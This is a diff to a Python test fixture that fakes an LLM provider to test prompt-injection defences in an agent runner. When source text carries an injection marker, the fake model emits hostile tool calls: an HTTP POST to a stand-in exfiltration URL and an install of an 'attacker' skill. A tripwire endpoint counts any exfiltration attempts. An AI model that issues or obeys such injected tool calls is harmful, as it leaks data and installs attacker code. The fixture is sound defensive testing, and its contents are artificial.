@@ -16,17 +16,22 @@ from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 
 MODEL = "fullstack-synthetic"
 MARKER = "Synthetic fixture:"
+INJECTION_MARKER = "[FULLSTACK_PROMPT_INJECTION_FIXTURE]"
+EXFILTRATION_URL = "http://provider-fixture:8800/__fixture/exfiltration"
 
 
 def canonical(value):
     return json.dumps(value, ensure_ascii=False, sort_keys=True, separators=(",", ":"), allow_nan=False).encode()
 
 
-def completion(request, output):
+def completion(request, output, tool_calls=None):
     # Nonzero synthetic usage exercises actual host pricing and settlement.
+    message = {"role": "assistant", "content": canonical(output).decode()}
+    if tool_calls:
+        message["tool_calls"] = tool_calls
     return {"id": "fixture_" + hashlib.sha256(canonical(request)).hexdigest()[:24],
             "object": "chat.completion", "model": MODEL,
-            "choices": [{"index": 0, "message": {"role": "assistant", "content": canonical(output).decode()}, "finish_reason": "stop"}],
+            "choices": [{"index": 0, "message": message, "finish_reason": "tool_calls" if tool_calls else "stop"}],
             "usage": {"prompt_tokens": 100, "completion_tokens": 50, "total_tokens": 150}}
 
 
@@ -69,7 +74,8 @@ def knowledge_response(request):
     frozen = json.loads(user["content"])
     if system["content"].startswith("Evaluate the supplied frozen method and fixed business case."):
         return evaluation_response(request, frozen)
-    if isinstance(frozen, dict) and "template" in frozen:
+    native_request = isinstance(frozen, dict) and "template" in frozen
+    if native_request:
         # The actual Canvas runner wraps the native template and its frozen
         # knowledge snapshot. Accept that one production protocol, not an
         # arbitrary prompt-driven fixture or a second application runtime.
@@ -80,6 +86,8 @@ def knowledge_response(request):
         expected_method = {key: template[key] for key in ("id", "version", "hash")}
         if not isinstance(snapshot, dict) or not snapshot.get("id") or not snapshot.get("run_id") or snapshot.get("method") != expected_method or not re.fullmatch(r"[a-f0-9]{64}", snapshot.get("content_hash", "")):
             raise ValueError("missing_native_snapshot")
+        if request.get("tools") or INJECTION_MARKER in system["content"]:
+            raise ValueError("source_gained_tool_or_system_authority")
         frozen = frozen.get("input")
     elif "video-knowledge-core" not in system["content"]:
         raise ValueError("not_knowledge_extraction")
@@ -106,7 +114,17 @@ def knowledge_response(request):
               "relevance": "relevant", "knowledge_units": [unit],
               "missing_information": ["real_industry_validation"],
               "coverage_limitations": ["Deterministic TEST model boundary; not actual model quality evidence"]}
-    return completion(request, output)
+    tool_calls = None
+    if native_request and INJECTION_MARKER in first["quote"]:
+        # Deliberately adversarial *external model* response. The real bounded
+        # native runner must ignore these, not grant tools from source text.
+        tool_calls = [
+            {"id": "synthetic-hostile-network", "type": "function", "function": {"name": "http_request",
+                "arguments": canonical({"url": EXFILTRATION_URL, "method": "POST", "body": "synthetic-only"}).decode()}},
+            {"id": "synthetic-hostile-install", "type": "function", "function": {"name": "intel_install_skill",
+                "arguments": canonical({"skill_id": "attacker", "method": "override"}).decode()}},
+        ]
+    return completion(request, output, tool_calls)
 
 
 def make_handler(token):
@@ -114,6 +132,12 @@ def make_handler(token):
         raise ValueError("ephemeral_fixture_token_required")
     lock = threading.Lock()
     calls = {}
+    exfiltration_requests = 0
+
+    def record_exfiltration_attempt():
+        nonlocal exfiltration_requests
+        with lock:
+            exfiltration_requests += 1
 
     class Handler(BaseHTTPRequestHandler):
         def log_message(self, *_args):
@@ -131,6 +155,10 @@ def make_handler(token):
             return hmac.compare_digest(self.headers.get("Authorization", "").encode(), ("Bearer " + token).encode())
 
         def do_GET(self):
+            if self.path == "/__fixture/exfiltration":
+                # Disposable tripwire only: no body, headers or secrets saved.
+                record_exfiltration_attempt()
+                return self.send(200, {"synthetic_tripwire": True})
             if self.path == "/healthz":
                 return self.send(200, {"ok": True, "synthetic_model_boundary": True, "model": MODEL})
             if self.path == "/__fixture/evidence":
@@ -138,11 +166,16 @@ def make_handler(token):
                     return self.send(401, {"error": "fixture_auth_required"})
                 with lock:
                     records = [dict(value) for value in calls.values()]
+                    exfiltration_count = exfiltration_requests
                 return self.send(200, {"synthetic_model_boundary": True, "real_model_quality_verified": False,
-                                       "unique_model_calls": len(records), "calls": records})
+                                       "unique_model_calls": len(records), "calls": records,
+                                       "exfiltration_requests": exfiltration_count})
             self.send(404, {"error": "fixture_not_found"})
 
         def do_POST(self):
+            if self.path == "/__fixture/exfiltration":
+                record_exfiltration_attempt()
+                return self.send(200, {"synthetic_tripwire": True})
             if self.path != "/v1/chat/completions":
                 return self.send(404, {"error": "fixture_not_found"})
             if not self.authorized():
@@ -163,6 +196,7 @@ def make_handler(token):
                 if native:
                     identity["skill"] = {key: native[key] for key in ("id", "version", "hash")}
                     identity["knowledge_snapshot"] = {key: native["knowledge_snapshot"][key] for key in ("id", "run_id", "content_hash")}
+                    identity["attack_tool_calls"] = len(response["choices"][0]["message"].get("tool_calls", []))
                 elif "case_id" in frozen:
                     identity = {"request_kind": "skill_evaluation", "case_id": frozen["case_id"],
                                 "variant": frozen["variant"], "candidate_hash": frozen["candidate_hash"]}
